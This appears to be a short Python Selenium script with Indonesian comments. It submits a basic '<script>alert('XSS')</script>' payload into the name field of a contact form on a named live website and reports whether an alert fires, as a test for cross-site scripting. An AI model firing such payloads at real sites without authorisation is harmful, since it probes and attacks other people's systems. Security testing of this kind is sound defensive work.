from selenium import webdriver
from selenium.webdriver.common.by import By

driver = webdriver.Chrome()
driver.get("https://javan.co.id/kontak")

# Coba input script XSS
nama_field = driver.find_element(By.NAME, "nama")
nama_field.send_keys("<script>alert('XSS')</script>")
submit_button = driver.find_element(By.XPATH, "//button[@type='submit']")
submit_button.click()

# Verifikasi apakah alert muncul (indikasi kerentanan XSS)
try:
    alert = driver.switch_to.alert
    print("Bug ditemukan: XSS pada form kontak!")
    alert.accept()
except:
    print("Tidak ada kerentanan XSS terdeteksi.")

driver.quit()